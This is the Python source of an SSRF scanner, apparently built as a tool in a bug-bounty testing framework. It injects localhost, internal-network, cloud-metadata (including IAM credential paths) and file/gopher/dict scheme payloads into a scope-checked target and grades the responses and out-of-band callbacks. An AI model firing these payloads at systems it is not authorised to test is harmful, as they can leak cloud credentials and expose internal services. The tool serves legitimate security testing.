"""Server-Side Request Forgery (SSRF) scanner / probe.

A parametric SSRF fuzzer that OWASP-Top-10 deserves its own scanner for,
alongside the rest of the active probes (cors_probe, web_probe, ffuf, ZAP).
It substitutes a battery of canonical SSRF payloads into a target parameter
and grades the responses + out-of-band callbacks to surface candidate
findings — instead of relying on slow manual ``zap_send_raw`` fuzzing.

Payload battery (categorised, capped):
  - **OOB / blind** — the collaborator URL + DNS name (the gold signal:
    a DNS or HTTP callback proves the server made a request server-side).
  - **localhost** — 127.0.0.1 / localhost / [::1] / 0.0.0.0 / 0 / 127.1
    plus a couple of port probes.
  - **internal + cloud metadata** — RFC1918 gateways and the cloud metadata
    endpoints (169.254.169.254, metadata.google.internal,
    169.254.169.254/latest/meta-data/).
  - **scheme bypass** — file:///etc/passwd, file:///etc/hostname,
    gopher://, dict://, ftp://, ldap:// (some servers accept non-http
    schemes in the fetch parameter).

Detection signals:
  - **Blind (hard confirm)** — a collaborator callback (DNS or HTTP) whose
    id matches the payload id means the server issued a server-side request.
    This is the only non-inferential signal.
  - **In-band reflection** — response body matches cloud-metadata patterns
    (ami-id, instance-id, security-credentials, project-id) or the
    ``file:///etc/passwd`` root: line. Strong, but confirm the actual
    credentialed metadata endpoint / file content separately.
  - **Error-based** — response body contains fetch/curl/connect error
    strings (``couldn't connect``, ``Connection refused``, ``Failed to
    connect``, ``getaddrinfo``, ``curl error``). Reveals server-side fetch
    behaviour (info leak + confirms a fetcher exists).
  - **Anomaly (inferential)** — status code or response length deviates
    from a benign baseline beyond a threshold; timing differential vs the
    baseline. Noisy over the network — flagged LOW, needs confirmation.

Scope (the important distinction):
  The TARGET endpoint is scope-gate validated (``check_scan``) before any
  request fires, and every redirect hop is gate-checked via
  ``utils.gated_http.gated_request``. The payload VALUES (collab domain,
  localhost, internal IPs, metadata endpoints) are NOT scope-gated: they are
  the *content* of the request, not the *destination of our traffic*. The
  SSRF itself is the server fetching an out-of-scope/internal resource —
  that is the vulnerability we are detecting, not traffic we are sending.
  Gating the payload values would make the test meaningless.

  The OOB CALLBACK BASE is likewise deliberately NEVER a ``check_scan``
  target: the collaborator endpoint itself (its /c/ callback paths and the
  /r/ redirect endpoint, lab or COLLAB_PUBLIC_URL public mode) is
  out-of-scope BY DEFINITION — it is ours, not the target's. Our egress is
  exactly: the target URL + the collaborator callback base, nothing else.
  Do not "harden" this into a gate — a scope check on the callback base
  silently kills blind/OOB detection. This is a deliberate design lock,
  documented here so a future hardening pass cannot undo it silently.

Honest limits (docstring is the contract):
  - Semi-blind heuristics (status/length/timing/error) are inferential and
    false-positive-prone; the blind collaborator callback is the only hard
    confirmation. Always prefer running ``collab_start`` first.
  - The probe is unauthenticated single-vector; authed SSRF surfaces and
    multi-step triggers need manual ``zap_send_raw`` drill-down.
  - Redirect-to-internal (a collaborator endpoint that 302s to 169.254.x)
    is included ONLY when ``redirect_to`` is passed AND a collaborator with
    the token-gated ``/r/<id>?to=<url>`` endpoint is running (lab listener
    or COLLAB_PUBLIC_URL funnel mode). Pass e.g.
    ``http://169.254.169.254/latest/meta-data/`` to have the target follow
    our 302 into its own internal space.
  - Network timing over a VPN/lab link is noisy; timing flags are advisory.
"""

from __future__ import annotations

import re
import time
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, urlencode, parse_qsl, urlsplit, urlunsplit

import requests

from constants import framework_tool

# Marker the operator places in the URL/body where the payload is injected.
# Familiar to ffuf users; if absent, `param` is used to inject instead.
_FUZZ = "FUZZ"

# Per-run caps so a misconfigured target can't pin a worker forever.
_MAX_PAYLOADS = 40
_PER_PAYLOAD_TIMEOUT = 12.0
_SETTLE_DELAY = 3.0  # wait for async OOB callbacks after the last payload

# Baseline benign value used to capture a "normal" response signature.
_BASELINE_URL = "http://example.com/"

# --- payload battery --------------------------------------------------------

_LOCALHOST_PAYLOADS: Tuple[str, ...] = (
    "http://127.0.0.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:80/",
    "http://localhost/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://0/",
    "http://127.1/",
)

_INTERNAL_PAYLOADS: Tuple[str, ...] = (
    "http://192.168.0.1/",
    "http://10.10.10.1/",
    "http://172.16.0.1/",
    "http://169.254.169.254/",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.azure.com/",
)

_SCHEME_PAYLOADS: Tuple[str, ...] = (
    "file:///etc/passwd",
    "file:///etc/hostname",
    "gopher://127.0.0.1:25/",
    "dict://127.0.0.1:11211/",
    "ftp://127.0.0.1/",
    "ldap://127.0.0.1/",
)

# --- detection signatures ---------------------------------------------------

_METADATA_PATTERNS: Tuple[Tuple[str, str], ...] = (
    ("aws_ami_id", r"\bami-[0-9a-f]{8,}\b"),
    ("aws_instance_id", r"\bi-[0-9a-f]{8,}\b"),
    ("aws_security_credentials", r"SecurityCredentials|AccessKeyId|SecretAccessKey|Token"),
    ("aws_account_id", r"\b\d{12}\b.*(?:aws|account|arn)"),
    ("gcp_project_id", r'"projectId"\s*:\s*"[a-z0-9-]+"'),
    ("gcp_access_token", r'"accessToken"\s*:\s*"[^"]{20,}"'),
    ("azure_metadata", r"azEnvironment|subscriptionId|compute"),
)
_PASSWD_LINE = re.compile(r"^(?:root|daemon|bin|nobody):[x*]:\d+:\d*:", re.MULTILINE)

_ERROR_PATTERNS: Tuple[str, ...] = (
    "couldn't connect", "connection refused", "failed to connect",
    "getaddrinfo", "curl error", "name resolution", "no address",
    "network is unreachable", "connection timed out",
    "failed to open stream", "php_network_getaddresses",
)

_TITLE_RE = re.compile(r"<title[^>]*>(.*?)</title>", re.IGNORECASE | re.DOTALL)


# --- helpers ----------------------------------------------------------------

def _inject(url: str, payload: str, param: Optional[str], method: str,
            body: Optional[str]) -> Tuple[str, Optional[str], Optional[Dict[str, str]]]:
    """Return (final_url, data, json) with the payload substituted.

    Substitution order: if ``FUZZ`` token is present in the URL (and/or
    body) it is replaced; otherwise ``param`` is injected into the query
    string (GET) or a form-urlencoded body (POST/PUT).
    """
    data = None
    json_body = None
    if _FUZZ in url:
        url = url.replace(_FUZZ, payload)
    elif param:
        parts = urlsplit(url)
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        q[param] = payload
        url = urlunsplit((parts.scheme, parts.netloc, parts.path,
                          urlencode(q), parts.fragment))
    # Body handling
    if body is not None:
        if _FUZZ in body:
            data = body.replace(_FUZZ, payload)
        elif param:
            # form body
            fields = dict(parse_qsl(body, keep_blank_values=True)) if body else {}
            fields[param] = payload
            data = urlencode(fields)
        else:
            data = body
    elif param and method != "GET":
        data = urlencode({param: payload})
    return url, data, json_body


def _signature(resp: Optional[requests.Response], elapsed: float,
               err: str) -> Dict[str, Any]:
    """Compact response signature for anomaly comparison."""
    if resp is None:
        return {"status": None, "length": None, "elapsed": round(elapsed, 3),
                "error": err}
    body = resp.text[:65536] if resp.encoding is not None or resp.content else ""
    return {
        "status": resp.status_code,
        "length": len(resp.content),
        "elapsed": round(elapsed, 3),
        "title": (_TITLE_RE.search(body).group(1).strip()[:120]
                  if _TITLE_RE.search(body) else ""),
        "error": "",
    }


def _detect_reflection(body: str) -> List[Dict[str, str]]:
    hits: List[Dict[str, str]] = []
    low = body
    for label, pat in _METADATA_PATTERNS:
        m = re.search(pat, low, re.IGNORECASE)
        if m:
            hits.append({"kind": label, "match": m.group(0)[:120]})
    if _PASSWD_LINE.search(body):
        hits.append({"kind": "etc_passwd_entry", "match": "root:x:..."})
    return hits


def _detect_errors(body: str) -> List[str]:
    low = body.lower()
    return [e for e in _ERROR_PATTERNS if e in low]


def _try_collab() -> Optional[Any]:
    """Return a (generate_fn, poll_fn) pair if the collaborator is running."""
    try:
        from listeners.collaborator import _get_collab  # noqa: F401
        _get_collab()  # raises RuntimeError if not started
        from listeners import collaborator as _c
        return _c
    except Exception:
        return None


def _scan_config() -> Tuple[Dict[str, str], Optional[float]]:
    """Program-mandated identification headers + rate cap (no args).

    Resolves from the operator-ARMED scope state via
    ``program_scope.get_armed_scan_config`` (the enforcement-by-code backstop
    ffuf/ZAP get via explicit scope_handle). Falls back to our own
    identifying UA when nothing is armed / no manifest is cached.
    """
    try:
        from auxiliaries.program_scope import get_armed_scan_config
        cfg = get_armed_scan_config() or {}
    except Exception:
        cfg = {}
    headers = dict(cfg.get("headers") or {})
    headers.setdefault("User-Agent", "framework-ssrfprobe/1.0")
    rate = cfg.get("max_requests_per_second")
    try:
        rate = float(rate) if rate and float(rate) > 0 else None
    except (TypeError, ValueError):
        rate = None
    return headers, rate


# --- the tool ---------------------------------------------------------------

@framework_tool(
    "SSRF scanner: substitute a canonical payload battery (OOB/collaborator, "
    "localhost, internal RFC1918 + cloud metadata, scheme bypasses, optional "
    "redirect-to-internal via the collaborator's /r/ 302 endpoint) into a "
    "target URL/param and grade responses + out-of-band callbacks. Blind "
    "SSRF is confirmed by a collaborator callback; in-band metadata/file "
    "reflection and fetch-error strings are surfaced with severity hints; "
    "status/length/timing anomalies are flagged LOW (inferential). Scope-"
    "gated on the target endpoint (payload values are intentionally not "
    "gated — they are what the server fetches, not our traffic). Program "
    "identification headers (e.g. X-HackerOne-Research) and rate caps from "
    "the armed program scope are auto-applied. Start collab_start first for "
    "blind detection; pass redirect_to= to unlock redirect-to-internal. "
    "Pair with zap_send_raw for authed/multi-step drill-down.",
    next_hints=["collab_poll", "collab_generate", "zap_send_raw", "report_finding"],
)
def scan_ssrf(
    target: str,
    param: str = "",
    method: str = "GET",
    body: str = "",
    collab_id: str = "",
    redirect_to: str = "",
    insecure: bool = False,
    timeout: float = _PER_PAYLOAD_TIMEOUT,
    max_payloads: int = _MAX_PAYLOADS,
    delay: float = 0.0,
) -> Dict[str, Any]:
    """Probe ``target`` for SSRF across the payload battery.

    Args:
        target: In-scope URL. Put the literal token ``FUZZ`` where the
            payload should go (e.g. ``https://app.x/fetch?url=FUZZ``). If no
            ``FUZZ`` token, pass ``param`` and it is injected into the query
            (GET) or form body (POST/PUT).
        param: Param name to inject when no ``FUZZ`` token is present.
        method: HTTP method (GET default; POST/PUT inject into body).
        body: Optional raw body template; may contain ``FUZZ``. For POST
            without a template, ``param`` is form-encoded into the body.
        collab_id: Pre-generated collaborator payload id (from
            ``collab_generate``). If omitted and the collaborator is
            running, one is generated automatically; if the collaborator is
            not running, blind payloads are skipped (noted in the envelope).
        redirect_to: Optional internal URL for the redirect-to-internal
            battery (e.g. ``http://169.254.169.254/latest/meta-data/``).
            Adds one blind payload through the collaborator's token-gated
            ``/r/<id>?to=<url>`` 302 endpoint — the target fetches our URL,
            we 302 it to ``redirect_to``, its fetcher follows (if it follows
            redirects) into its own internal space. Needs a running
            collaborator (lab or COLLAB_PUBLIC_URL public mode).
        insecure: Skip TLS verification (self-signed lab certs).
        timeout: Per-payload request timeout in seconds.
        max_payloads: Cap on total payloads sent (default 40).
        delay: Extra seconds between payload requests (politeness knob).
            A program-mandated max-requests-per-second from the armed
            program scope is honoured automatically (the larger of the two
            wins). Requests are serial regardless.
    """
    from utils.scope_gate import check_scan, ScopeGateError
    from utils.gated_http import gated_request

    scan_headers, scan_rps = _scan_config()
    eff_delay = max(0.0, float(delay or 0.0),
                    (1.0 / scan_rps) if scan_rps else 0.0)

    target = (target or "").strip()
    method = (method or "GET").upper()
    if not target or "://" not in target:
        raise ScopeGateError(
            "scope gate: pass an explicit in-scope target URL (scheme included)."
        )
    if _FUZZ not in target and not param and _FUZZ not in (body or ""):
        raise ScopeGateError(
            "scan_ssrf: no injection point — put FUZZ in the target/body or "
            "pass param=<name>."
        )
    # Gate the TARGET endpoint (not the payload values).
    _sc_ok, _sc_reason = check_scan(target.replace(_FUZZ, _BASELINE_URL)
                                    if _FUZZ in target else target)
    if not _sc_ok:
        raise ScopeGateError(f"scope gate: {_sc_reason}")

    started = time.time()
    collab = _try_collab()
    blind_payloads: List[Tuple[str, str]] = []  # (id, payload_url)

    # Build the payload list with per-payload ids for OOB correlation.
    payloads: List[Dict[str, Any]] = []

    def _add(category: str, value: str, pid: str = "") -> None:
        payloads.append({"category": category, "value": value, "id": pid})

    # OOB / blind payloads (only if collaborator available).  We mint one
    # base collab id, then build two blind payloads whose collab sub-ids are
    # derived from it ({id}h / {id}d) so each callback can be correlated back
    # to the exact payload.  collab_poll filters by substring on the base id,
    # so both sub-ids' callbacks are returned together.
    collab_domain = ""
    collab_public_base = ""
    if collab is not None:
        if not collab_id:
            try:
                import json as _json
                gen = collab.collab_generate()
                gen = _json.loads(gen) if isinstance(gen, str) else gen
                collab_id = gen["id"]
                if gen.get("mode") == "public":
                    collab_public_base = (gen.get("base") or "").rstrip("/")
                else:
                    _dom = gen.get("dns_name", "")
                    collab_domain = (_dom.split(".", 1)[1] if "." in _dom
                                     else (getattr(collab, "_COLLAB_DOMAIN", "")
                                           or "oob.lab"))
            except Exception:
                collab = None
        else:
            # Pre-supplied collab_id: mirror the LIVE listener mode instead of
            # assuming lab subdomain mode. A hardcoded *.oob.lab payload is
            # stale/unreachable when the collaborator runs in PUBLIC
            # (COLLAB_PUBLIC_URL / funnel) mode — public DNS cannot resolve
            # oob.lab subdomains; path-based /c/ callbacks are the only
            # signal there. Read the module's env-resolved constants.
            base = (getattr(collab, "_PUBLIC_BASE_URL", "") or "").strip().rstrip("/")
            if base:
                collab_public_base = base
            else:
                collab_domain = (getattr(collab, "_COLLAB_DOMAIN", "")
                                 or "oob.lab")
    if collab is not None and collab_id:
        sub_http = f"{collab_id}h"
        sub_dns = f"{collab_id}d"
        if collab_public_base:
            # Public (funnel) mode: single public host, path-based ids.
            blind: Tuple[Tuple[str, str], ...] = (
                (sub_http, f"{collab_public_base}/c/{sub_http}/"),
                (sub_dns, f"{collab_public_base}/c/{sub_dns}/"),
            )
        else:
            if not collab_domain:
                collab_domain = (getattr(collab, "_COLLAB_DOMAIN", "")
                                 or "oob.lab")
            blind = (
                (sub_http, f"http://{sub_http}.{collab_domain}/ssrf"),
                (sub_dns, f"http://{sub_dns}.{collab_domain}/"),
            )
        for pid, url in blind:
            _add("blind", url, pid=pid)
            blind_payloads.append((pid, url))
        if redirect_to:
            rid = f"{collab_id}r"
            r_url = (f"{collab_public_base}/r/{rid}?to={urlencode({'to': redirect_to})}"
                     if collab_public_base else
                     f"http://{rid}.{collab_domain}/r/{rid}"
                     f"?to={urlencode({'to': redirect_to})}")
            _add("redirect_oob", r_url, pid=rid)
            blind_payloads.append((rid, r_url))
    collab_unavailable = collab is None

    for v in _LOCALHOST_PAYLOADS:
        _add("localhost", v)
    for v in _INTERNAL_PAYLOADS:
        _add("internal_metadata", v)
    for v in _SCHEME_PAYLOADS:
        _add("scheme_bypass", v)

    payloads = payloads[: max(1, int(max_payloads))]

    # Baseline: a benign external URL to capture a "normal" signature.
    baseline_sig: Optional[Dict[str, Any]] = None
    try:
        b_url, b_data, b_json = _inject(target, _BASELINE_URL, param or None,
                                        method, body or None)
        t0 = time.time()
        b_resp, _h = gated_request(
            method, b_url, data=b_data, json=b_json, verify=not insecure,
            timeout=(5.0, timeout), allow_redirects=False,
            headers=scan_headers,
        )
        baseline_sig = _signature(b_resp, time.time() - t0, "")
    except ScopeGateError:
        raise
    except Exception as e:  # noqa: BLE001
        baseline_sig = _signature(None, 0.0, f"baseline_failed:{type(e).__name__}")

    # Fire each payload.
    results: List[Dict[str, Any]] = []
    last_sent_ts = 0.0
    for i, p in enumerate(payloads):
        if eff_delay > 0 and i > 0:
            time.sleep(eff_delay)
        f_url, f_data, f_json = _inject(target, p["value"], param or None,
                                        method, body or None)
        t0 = time.time()
        try:
            resp, _h = gated_request(
                method, f_url, data=f_data, json=f_json, verify=not insecure,
                timeout=(5.0, timeout), allow_redirects=False,
                headers=scan_headers,
            )
            sig = _signature(resp, time.time() - t0, "")
            body_txt = resp.text[:65536] if resp.encoding is not None or resp.content else ""
            reflections = _detect_reflection(body_txt)
            errors = _detect_errors(body_txt)
        except ScopeGateError as e:
            sig = _signature(None, time.time() - t0, f"scope:{e}")
            reflections, errors = [], []
        except requests.exceptions.Timeout:
            sig = _signature(None, timeout, "timeout")
            reflections, errors = [], []
        except requests.exceptions.RequestException as e:
            sig = _signature(None, time.time() - t0, type(e).__name__)
            reflections, errors = [], []

        # Anomaly flags vs baseline.
        anomaly = ""
        if baseline_sig and baseline_sig.get("status") is not None:
            if sig.get("status") is not None and sig["status"] != baseline_sig["status"]:
                anomaly = f"status {sig['status']} vs baseline {baseline_sig['status']}"
            elif sig.get("length") is not None and baseline_sig.get("length") is not None:
                bl = baseline_sig["length"] or 1
                if abs((sig["length"] or 0) - (baseline_sig["length"] or 0)) > max(200, bl * 0.3):
                    anomaly = (f"length {sig['length']} vs baseline "
                               f"{baseline_sig['length']}")
            elif sig.get("elapsed") is not None and baseline_sig.get("elapsed") is not None:
                be = baseline_sig["elapsed"]
                if sig["elapsed"] > be + 2.0:
                    anomaly = f"slow {sig['elapsed']}s vs baseline {be}s"

        results.append({
            "category": p["category"],
            "payload": p["value"],
            "id": p["id"],
            **sig,
            "reflection": reflections,
            "fetch_errors": errors,
            "anomaly": anomaly,
        })
        last_sent_ts = time.time()

    # Blind confirmation: poll the collaborator after a settle delay.
    blind_hits: List[Dict[str, Any]] = []
    if not collab_unavailable and collab is not None and blind_payloads:
        time.sleep(_SETTLE_DELAY)
        try:
            import json as _json
            raw = collab.collab_poll(since=started, id=collab_id)
            cbs = _json.loads(raw) if isinstance(raw, str) else (raw or [])
        except Exception:
            cbs = []
        for cb in cbs:
            qname = (cb.get("qname") or "").lower()
            host = (cb.get("host") or "").lower()
            path = (cb.get("path") or "").lower()
            proto = cb.get("proto", "")
            # Correlate to a payload id by substring.
            matched = next((pid for pid, _u in blind_payloads
                            if pid and pid in (qname + host + path)), None)
            blind_hits.append({
                "proto": proto,
                "src_ip": cb.get("src_ip"),
                "qname": cb.get("qname"),
                "host": host,
                "path": path,
                "matched_payload_id": matched or collab_id,
            })

    # Verdict / severity aggregation.
    verdicts: List[Dict[str, Any]] = []
    for r in results:
        if r["reflection"]:
            kinds = [h["kind"] for h in r["reflection"]]
            if any("passwd" in k or "credentials" in k or "access_token" in k
                   for k in kinds):
                verdicts.append({"payload": r["payload"], "verdict":
                                 "reflected_secret", "severity_hint":
                                 "CRITICAL candidate — secret/metadata reflected"})
            else:
                verdicts.append({"payload": r["payload"], "verdict":
                                 "metadata_reflection", "severity_hint":
                                 "HIGH candidate — cloud metadata reflected"})
        if r["fetch_errors"]:
            verdicts.append({"payload": r["payload"], "verdict": "fetch_error_leak",
                             "severity_hint": "MEDIUM — server-side fetch error "
                             "leaked (confirms a fetcher): " +
                             ",".join(r["fetch_errors"][:3])})
        if r["anomaly"]:
            verdicts.append({"payload": r["payload"], "verdict": "anomaly",
                             "severity_hint": "LOW (inferential) — " + r["anomaly"]})
    if blind_hits:
        verdicts.insert(0, {
            "verdict": "blind_ssrf_confirmed",
            "severity_hint": "HIGH — OOB callback confirms server-side request",
            "callbacks": blind_hits,
        })

    # Dedupe verdicts by (verdict, payload).
    seen = set()
    deduped: List[Dict[str, Any]] = []
    for v in verdicts:
        key = (v.get("verdict", ""), v.get("payload", ""))
        if key in seen:
            continue
        seen.add(key)
        deduped.append(v)

    return {
        "status": "Success",
        "target": target,
        "method": method,
        "param": param,
        "baseline": baseline_sig,
        "collab_id": collab_id,
        "collab_available": not collab_unavailable,
        "scan_headers_applied": sorted(
            h for h in scan_headers if h.lower() != "user-agent"),
        "rate_cap_rps": scan_rps,
        "payloads_sent": len(results),
        "blind_hits": blind_hits,
        "results": results,
        "verdicts": deduped,
        "worst_severity_hint": (deduped[0]["severity_hint"] if deduped else
                                "no signal — honest negative (blind needs "
                                "collab_start; semi-blind is inferential)"),
        "elapsed_s": round(time.time() - started, 2),
        "note": (
            "Blind callback = the only hard confirmation. Reflection/secret "
            "hits are strong but confirm the real endpoint. Anomaly/error "
            "flags are inferential — confirm with zap_send_raw. "
            + ("Redirect-to-internal payload included via the collaborator "
               "/r/ endpoint (redirect_to was passed)."
               if redirect_to else
               "Redirect-to-internal payloads are only included when "
               "redirect_to is passed (collaborator /r/ endpoint).")
        ),
    }
